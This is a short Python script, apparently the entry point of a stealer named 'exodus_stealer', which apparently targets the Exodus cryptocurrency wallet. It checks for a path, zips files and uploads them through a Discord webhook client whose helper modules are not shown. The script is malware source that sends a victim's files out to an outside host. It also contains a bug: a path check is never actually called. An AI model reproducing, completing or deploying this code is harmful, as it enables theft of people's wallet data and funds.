from helpers.discord import Discord_Webhook_Client
from helpers.files import Files

def exodus_stealer():
    if Files.path_exists == True:
        if Files.zip_files() == True:
            Discord_Webhook_Client.send_file()
        else:
            exit(code=None)
    else:
        exit(code=None)

if __name__ == "__main__":
    Discord_Webhook_Client()
    exodus_stealer()